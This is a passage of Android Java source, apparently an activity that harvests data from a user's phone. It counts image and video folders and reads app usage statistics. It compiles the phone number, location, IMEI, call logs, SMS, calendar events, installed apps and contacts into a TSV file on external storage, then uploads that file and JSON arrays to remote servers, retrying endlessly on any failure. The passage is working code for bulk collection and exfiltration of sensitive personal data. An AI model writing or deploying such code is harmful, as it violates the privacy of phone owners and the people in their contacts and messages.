            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                userappdataupload();
            }

        });


    }

    public void getVideosFolderDatas() {

        sbvideos.append("FOLDER WISE VIDEOS" + "\n\n");


        sbvideos.append("Folder Name,  No. of Videos " + "\n\n");

        new getVideos(StartCommonFetchingActivity.this).execute();

    }

    public int getCountStr(String foldername) {

        ArrayList<VideoData> subArrayliat = new ArrayList<>();

        for (int i = 0; i < arrayList.size(); i++) {
            VideoData v = arrayList.get(i);
            if (v.getData().contains(foldername)) {
                subArrayliat.add(v);
            }

        }

        return subArrayliat.size();

    }

    private void getPicturePaths() {

        StringBuffer sb = new StringBuffer();

        sb.append("FOLDER WISE IMAGES" + "\n\n");


        sb.append("Folder Name,  No. of Images " + "\n\n");


        ArrayList<imageFolder> picFolders = new ArrayList<>();
        ArrayList<String> picPaths = new ArrayList<>();
        Uri allImagesuri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns.DATA, MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.BUCKET_ID};
        Cursor cursor = this.getContentResolver().query(allImagesuri, projection, null, null, null);
        try {
            if (cursor != null) {
                cursor.moveToFirst();
            }
            do {
                imageFolder folds = new imageFolder();
                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                String folder = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME));
                String datapath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));


                String folderpaths = datapath.substring(0, datapath.lastIndexOf(folder + "/"));
                folderpaths = folderpaths + folder + "/";
                if (!picPaths.contains(folderpaths)) {
                    picPaths.add(folderpaths);
                    folds.setPath(folderpaths);
                    folds.setFolderName(folder);
                    folds.setFirstPic(datapath);//if the folder has only one picture this line helps to set it as first so as to avoid blank image in itemview
                    folds.addpics();
                    picFolders.add(folds);

                } else {
                    for (int i = 0; i < picFolders.size(); i++) {
                        if (picFolders.get(i).getPath().equals(folderpaths)) {
                            picFolders.get(i).setFirstPic(datapath);
                            picFolders.get(i).addpics();
                        }
                    }
                }


            } while (cursor.moveToNext());
            cursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (int i = 0; i < picFolders.size(); i++) {

            Log.d("picture folders", picFolders.get(i).getFolderName() +
                    " and path = " + picFolders.get(i).getPath() + " " + picFolders.get(i).getNumberOfPics());
            JsonObject pictureobject=new JsonObject();
            pictureobject.addProperty("FolderName", picFolders.get(i).getFolderName());
            pictureobject.addProperty("NoOfImages", String.valueOf(picFolders.get(i).getNumberOfPics()));
            pictureobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
            picturearry.add(pictureobject);


            sb.append(picFolders.get(i).getFolderName() + ",  " +
                    picFolders.get(i).getNumberOfPics() + "  " +
                    "\n");

        }


        new SavePref(StartCommonFetchingActivity.this).setImagesFolders(sb.toString());
        getAppUsage();
        sbfinal.append("Mobile Number:"+new SavePref(StartCommonFetchingActivity.this).getMyPhoneNumber() +"\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getLocation() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getHardSoftInfo() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyIMEI() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCallLogData() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getSMSData() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCalenderEvents() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getInstalledApps() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCatWiseApps() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getAppUsage() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getContactsList() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getImagesFolders() + "\n\n");
        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getVideosFolders() + "\n\n");


        Log.e("EFwdefdsaxzdcefdcx", new SavePref(StartCommonFetchingActivity.this).getLocation());

        Log.e("EFwdefdcefdcx", new SavePref(StartCommonFetchingActivity.this).getAppUsage());

        uploadFile();


    }

    /////////upload folder image count

    private void imagecountupload() {


        Call<JsonArray> call = retrofitService1.postimagedata(picturearry);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.code()==200) {
                        Appusagedataupload();

                    } else {
                        imagecountupload();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            imagecountupload();
                            break;
                        case 500:
                            imagecountupload();

                            break;
                        default:

                            imagecountupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                imagecountupload();
            }

        });


    }


    //APP USAGE
    public void getAppUsage() {
        UsageStatsAdapter();

    }

    public void UsageStatsAdapter() {

        final int _DISPLAY_ORDER_USAGE_TIME = 0;
        final ArrayMap<String, String> mAppLabelMap = new ArrayMap<>();
        final ArrayList<UsageStats> mPackageStats = new ArrayList<>();
        StringBuffer sb = new StringBuffer();
        UsageStatsManager mUsageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        int mDisplayOrder = _DISPLAY_ORDER_USAGE_TIME;
        LastTimeUsedComparator mLastTimeUsedComparator = new LastTimeUsedComparator();
        UsageTimeComparator mUsageTimeComparator = new UsageTimeComparator();
        AppNameComparator mAppLabelComparator;
        PackageManager mPm = getPackageManager();


        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.DAY_OF_YEAR, -5);

        sb.append("APP USAGE" + "\n\n");


        sb.append("App Name,  Last Used On,  Total Usage Time " + "\n\n");
        final List<UsageStats> stats =
                mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST,
                        cal.getTimeInMillis(), System.currentTimeMillis());
        if (stats == null) {
            return;
        }

        ArrayMap<String, UsageStats> map = new ArrayMap<>();
        final int statCount = stats.size();
        for (int i = 0; i < statCount; i++) {
            final UsageStats pkgStats = stats.get(i);

            try {
                ApplicationInfo appInfo = mPm.getApplicationInfo(pkgStats.getPackageName(), 0);
                String label = appInfo.loadLabel(mPm).toString();
                mAppLabelMap.put(pkgStats.getPackageName(), label);

                UsageStats existingStats =
                        map.get(pkgStats.getPackageName());
                if (existingStats == null) {
                    map.put(pkgStats.getPackageName(), pkgStats);
                } else {
                    existingStats.add(pkgStats);
                }

            } catch (PackageManager.NameNotFoundException e) {

            }
        }
        mPackageStats.addAll(map.values());


        mAppLabelComparator = new AppNameComparator(mAppLabelMap);


        for (int pos = 0; pos < mPackageStats.size(); pos++) {

            UsageStats pkgStats = mPackageStats.get(pos);
            if (pkgStats != null) {

                Log.e("Fefcd", "here");

                sb.append(mAppLabelMap.get(pkgStats.getPackageName()) + ",  " +
                        ((DateUtils.formatSameDayTime(pkgStats.getLastTimeUsed(), System.currentTimeMillis(), DateFormat.MEDIUM, DateFormat.MEDIUM))) + ",  " +
                        DateUtils.formatElapsedTime(pkgStats.getTotalTimeInForeground() / 1000) + ",  " +
                        "\n");
                sb.append("App Name,  Last Used On,  Total Usage Time " + "\n\n");
                JsonObject appusageobject=new JsonObject();
                appusageobject.addProperty("AppName", mAppLabelMap.get(pkgStats.getPackageName()));
                appusageobject.addProperty("LastUsedOn", String.valueOf(((DateUtils.formatSameDayTime(pkgStats.getLastTimeUsed(), System.currentTimeMillis(), DateFormat.MEDIUM, DateFormat.MEDIUM)))));
                appusageobject.addProperty("TotalUsageTime", DateUtils.formatElapsedTime(pkgStats.getTotalTimeInForeground() / 1000) );
                appusageobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                appusage.add(appusageobject);


            } else {

            }


            new SavePref(StartCommonFetchingActivity.this).setAppUsage(sb.toString());
        }
        running=false;
        ll2.setVisibility(View.VISIBLE);
        ll1.setVisibility(View.GONE);
        hardwareuploadFile();

    }
///////app usage data upload


    private void Appusagedataupload() {


        Call<JsonArray> call = retrofitService1.postappusagedata(appusage);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.isSuccessful()) {


                    } else {
                        Appusagedataupload();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:
                            Appusagedataupload();
                            break;
                        case 500:
                            Appusagedataupload();

                            break;
                        default:

                            Appusagedataupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                Appusagedataupload();

            }

        });


    }






    private void uploadFile() {

        File imagefile = generateNoteOnSD(StartCommonFetchingActivity.this,
                "PHONEDETAILS.tsv", StartCommonFetchingActivity.sbfinal.toString());

        RequestBody image = RequestBody.create(MediaType.parse("multipart/form-data"), imagefile);

        SimpleDateFormat postFormater = new SimpleDateFormat("MMMM_dd_yyyy_hh:mm:ss");

        String newDateStr = postFormater.format(new Date());


        MultipartBody.Part partImage = MultipartBody.Part.createFormData("csv_file",
                new SavePref(this).getMyPhoneNumber() + "_" + newDateStr + "_file" + ".tsv", image);




        retrofitService.postUpdateCallWithImage(getRequestBody("abc"),
                partImage).enqueue(new Callback<UpdateModel>() {
            @Override
            public void onResponse(Call<UpdateModel> call, Response<UpdateModel> response) {

                try {
                    final UpdateModel registerModel = response.body();
                    UpdateDetailModel registerDetailModel = registerModel.getLoginDetailModels().get(0);

                    Log.e("FewcxesdxedsABC", registerDetailModel.getCsv_file() + " " + registerDetailModel.getMsg());


                    String stringYouExtracted = (String) registerDetailModel.getCsv_file();
                    ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("label", stringYouExtracted);
                    clipboard.setPrimaryClip(clip);

                    if (registerDetailModel.getSuccess().equalsIgnoreCase("1")) {


                    } else {
                    }


                } catch (Exception e) {
                    switch (response.code()) {
                        case 404:

                            new AlertDialog.Builder(StartCommonFetchingActivity.this)
                                    .setTitle(getResources().getString(R.string.app_name))
                                    .setMessage("Server not found !")
                                    .setIcon(R.drawable.logo)
                                    .setPositiveButton("Try again", new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int id) {
                                            startActivity(new Intent(StartCommonFetchingActivity.this, TermsandConditionsActivity.class));
                                        }
                                    }).show();
                            break;
                        case 500:
                            new AlertDialog.Builder(StartCommonFetchingActivity.this)
                                    .setTitle(getResources().getString(R.string.app_name))
                                    .setMessage("server broken!")
                                    .setIcon(R.drawable.logo)
                                    .setPositiveButton("Try again", new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int id) {
                                            startActivity(new Intent(StartCommonFetchingActivity.this, TermsandConditionsActivity.class));
                                        }
                                    }).show();

                            break;
                        default:

                            new AlertDialog.Builder(StartCommonFetchingActivity.this)
                                    .setTitle(getResources().getString(R.string.app_name))
                                    .setMessage("unknown error")
                                    .setIcon(R.drawable.logo)
                                    .setPositiveButton("Try again", new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int id) {
                                            startActivity(new Intent(StartCommonFetchingActivity.this, TermsandConditionsActivity.class));
                                        }
                                    }).show();
                            break;
                    }


                }


            }

            @Override
            public void onFailure(Call<UpdateModel> call, Throwable t) {
                Log.e("Fewcxesdxeds", t.getMessage());
                t.printStackTrace();


            }
        });


    }

    public File generateNoteOnSD(Context context, String sFileName, String sBody) {
        File gpxfile = null;

        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();

        } catch (IOException e) {
            e.printStackTrace();
        }

        return gpxfile;

    }

    public RequestBody getRequestBody(String s) {
        RequestBody requestBody = RequestBody.create(MediaType.parse("multipart/form-data"), s);
        return requestBody;

    }

    public static class LastTimeUsedComparator implements Comparator<UsageStats> {
        @Override
        public final int compare(UsageStats a, UsageStats b) {
            return (int) (b.getLastTimeUsed() - a.getLastTimeUsed());
        }
    }

    public static class UsageTimeComparator implements Comparator<UsageStats> {
        @Override
        public final int compare(UsageStats a, UsageStats b) {
            return (int) (b.getTotalTimeInForeground() - a.getTotalTimeInForeground());
        }
    }

    public static class AppNameComparator implements Comparator<UsageStats> {
        private Map<String, String> mAppLabelList;

        AppNameComparator(Map<String, String> appList) {
            mAppLabelList = appList;
        }

        @Override
        public final int compare(UsageStats a, UsageStats b) {
            String alabel = mAppLabelList.get(a.getPackageName());
            String blabel = mAppLabelList.get(b.getPackageName());
            return alabel.compareTo(blabel);
        }
    }

    class getVideos extends AsyncTask<Void, Void, ArrayList<VideoData>> {
        Context context;

        getVideos(Context context) {
            this.context = context;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            arrayList = new ArrayList<>();

        }

        @Override
        protected ArrayList<VideoData> doInBackground(Void... voids) {

            Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

            Cursor c = context.getContentResolver().query(uri, null, null, null,
                    MediaStore.Video.VideoColumns.DATE_ADDED + " DESC");


            int vidsCount = 0;

            if (c != null && c.moveToFirst()) {
                vidsCount = c.getCount();
                do {


                    String name = c.getString(c.getColumnIndex(MediaStore.Video.Media.TITLE));
                    String album = c.getString(c.getColumnIndex(MediaStore.Video.Media.ALBUM));
                    String data = c.getString(c.getColumnIndex(MediaStore.Video.Media.DATA));
                    long duration = c.getLong(c.getColumnIndex(MediaStore.Video.Media.DURATION));
                    long size = c.getLong(c.getColumnIndex(MediaStore.Video.Media.SIZE));


                    long fileSizeInKB = size / 1024;


                    VideoData vd = new VideoData(name, album, data, convertDuration(duration), formatFileSize(size));
                    arrayList.add(vd);
                } while (c.moveToNext());
                Log.d("count", vidsCount + "");
                c.close();
            }


            return arrayList;
        }

        public String formatFileSize(long size) {
            String hrSize = null;

            double b = size;
            double k = size / 1024.0;
            double m = ((size / 1024.0) / 1024.0);
            double g = (((size / 1024.0) / 1024.0) / 1024.0);
            double t = ((((size / 1024.0) / 1024.0) / 1024.0) / 1024.0);

            DecimalFormat dec = new DecimalFormat("0.00");

            if (t > 1) {
                hrSize = dec.format(t).concat(" TB");
            } else if (g > 1) {
                hrSize = dec.format(g).concat(" GB");
            } else if (m > 1) {
                hrSize = dec.format(m).concat(" MB");
            } else if (k > 1) {
                hrSize = dec.format(k).concat(" KB");
            } else {
                hrSize = dec.format(b).concat(" Bytes");
            }

            return hrSize;
        }

        public String convertDuration(long duration) {
            String out = null;
            long hours = 0;
            try {
                hours = (duration / 3600000);
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
                return out;
            }
            long remaining_minutes = (duration - (hours * 3600000)) / 60000;
            String minutes = String.valueOf(remaining_minutes);
            if (minutes.equals(0)) {
                minutes = "00";
            }
            long remaining_seconds = (duration - (hours * 3600000) - (remaining_minutes * 60000));
            String seconds = String.valueOf(remaining_seconds);
            if (seconds.length() < 2) {
                seconds = "00";
            } else {
                seconds = seconds.substring(0, 2);
            }

            if (hours > 0) {
                out = hours + ":" + minutes + ":" + seconds;
            } else {
                out = minutes + ":" + seconds;
            }

            return out;

        }

        @Override
        protected void onPostExecute(ArrayList<VideoData> videoDataList) {
            super.onPostExecute(videoDataList);
            if (videoDataList != null) {


                for (i = 0; i < videoDataList.size(); i++) {
                    VideoData videoData = videoDataList.get(i);
                    Log.e(i + "", videoData.getData());

                    int lastInex1 = videoData.getData().lastIndexOf("/");

                    if (lastInex1 != -1) {
                        subString = videoData.getData().substring(0, lastInex1);
                        int lastIndex2 = subString.lastIndexOf("/");
                        folderName = subString.substring(lastIndex2 + 1, lastInex1);
                    }
                    path.add(folderName);


                    for (int i = 0; i < path.size(); i++) {
                        for (j = i + 1; j < path.size(); j++) {
                            if (path.get(i).equals(path.get(j))) {
                                path.remove(j);
                                j--;
                            }
                        }
                    }
                }


                for (int in = 0; in < path.size(); in++) {
                    sbvideos.append(path.get(in) + ",  " +
                            getCountStr(path.get(in)) + "  " +
                            "\n");

                    JsonObject videoobjectlist=new JsonObject();
                    videoobjectlist.addProperty("FolderName", path.get(in));
                    videoobjectlist.addProperty("NoOfVideos", String.valueOf(getCountStr(path.get(in))));
                    videoobjectlist.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                    videoarraylist.add(videoobjectlist);


                }


                new SavePref(StartCommonFetchingActivity.this).setVideosFolders(sbvideos.toString());

                getPicturePaths();


            } else {

            }
        }

    }

    private void Videocountupload() {

        Call<JsonArray> call = retrofitService1.postvideodata(videoarraylist);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.code()==200) {
                        imagecountupload();

                    } else {
                        Videocountupload();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            Videocountupload();
                            break;
                        case 500:
                            Videocountupload();

                            break;
                        default:

                            Videocountupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                Videocountupload();
            }

        });


    }

    public static String humanReadableByteCountBin(long bytes) {
        long absB = bytes == Long.MIN_VALUE ? Long.MAX_VALUE : Math.abs(bytes);
        if (absB < 1024) {
            return bytes + " B";
        }
        long value = absB;
        CharacterIterator ci = new StringCharacterIterator("KMGTPE");
        for (int i = 40; i >= 0 && absB > 0xfffccccccccccccL >> i; i -= 10) {
            value >>= 10;
            ci.next();
        }
        value *= Long.signum(bytes);
        return String.format("%.1f %ciB", value / 1024.0, ci.current());
    }
}



